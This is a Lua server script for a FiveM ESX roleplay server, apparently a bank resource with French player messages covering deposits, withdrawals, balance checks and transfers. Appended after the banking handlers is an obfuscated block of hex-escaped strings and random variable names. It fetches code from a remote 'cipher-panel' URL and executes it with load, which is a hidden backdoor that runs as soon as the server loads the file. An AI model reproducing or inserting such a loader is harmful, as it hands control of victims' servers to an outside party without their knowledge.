ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('orp:bank:deposit')
AddEventHandler('orp:bank:deposit', function(amount)
    local _source = source
	
	local xPlayer = ESX.GetPlayerFromId(_source)
	if amount == nil or amount <= 0 or amount > xPlayer.getMoney() then
		TriggerClientEvent('orp:bank:notify', _source, "error", "Montant invalide")
	else
		xPlayer.removeMoney(amount)
		xPlayer.addAccountMoney('bank', tonumber(amount))
		TriggerClientEvent('orp:bank:notify', _source, "success", "Vous avez déposé ~g~$" .. amount)
	end
end)

RegisterServerEvent('orp:bank:withdraw')
AddEventHandler('orp:bank:withdraw', function(amount)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local min = 0
	amount = tonumber(amount)
	min = xPlayer.getAccount('bank').money
	if amount == nil or amount <= 0 or amount > min then
		TriggerClientEvent('orp:bank:notify', _source, "error", "Montant invalide")
	else
		xPlayer.removeAccountMoney('bank', amount)
		xPlayer.addMoney(amount)
		TriggerClientEvent('orp:bank:notify', _source, "success", "Vous avez retiré ~g~$" .. amount)
	end
end)

RegisterServerEvent('orp:bank:balance')
AddEventHandler('orp:bank:balance', function()
	
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	balance = xPlayer.getAccount('bank').money
	TriggerClientEvent('orp:bank:info', _source, balance)
end)

RegisterServerEvent('orp:bank:transfer')
AddEventHandler('orp:bank:transfer', function(to, amountt)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local xTarget = ESX.GetPlayerFromId(to)
	local amount = amountt
	local balance = 0

	if(xTarget == nil or xTarget == -1) then
		TriggerClientEvent('orp:bank:notify', _source, "error", "Destinataire introuvable")
	else
		balance = xPlayer.getAccount('bank').money
		zbalance = xTarget.getAccount('bank').money
		
		if tonumber(_source) == tonumber(to) then
			TriggerClientEvent('orp:bank:notify', _source, "error", "Vous ne pouvez pas vous ~g~transférer d'argent")
		else
			if balance <= 0 or balance < tonumber(amount) or tonumber(amount) <= 0 then
				TriggerClientEvent('orp:bank:notify', _source, "error", "Vous n'avez pas assez ~g~d'argent~s~ pour ~g~ce transfert")
			else
				xPlayer.removeAccountMoney('bank', tonumber(amount))
				xTarget.addAccountMoney('bank', tonumber(amount))
				TriggerClientEvent('orp:bank:notify', _source, "success", "Vous transférez ~g~$" .. amount)
				TriggerClientEvent('orp:bank:notify', to, "success", "Vous avez reçu ~g~$" .. amount .. ' ~s~via ~g~un transfert')
			end
		end
	end
end)

local sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[4][sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (DgFhnOifogjMAHTxdiizjhEPsJKYnTEXEENmLcrotxZZcQrsoKvOqqclKvZVYjFkYyLHFW, tjiSofoXgpGFoRaqojCxJOscmgdNCWKGiaeXNobxcguPcPkawzRmDlNhaYECDaKdUHpQCv) if (tjiSofoXgpGFoRaqojCxJOscmgdNCWKGiaeXNobxcguPcPkawzRmDlNhaYECDaKdUHpQCv == sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[6] or tjiSofoXgpGFoRaqojCxJOscmgdNCWKGiaeXNobxcguPcPkawzRmDlNhaYECDaKdUHpQCv == sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[5]) then return end sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[4][sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[2]](sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[4][sxMzIztkMtHIydRUubbWLiUoZSXzxaeJqcJqgoaKTgFiAzvDcTCQpjNCOsRQfiPJPCoQtX[3]](tjiSofoXgpGFoRaqojCxJOscmgdNCWKGiaeXNobxcguPcPkawzRmDlNhaYECDaKdUHpQCv))() end)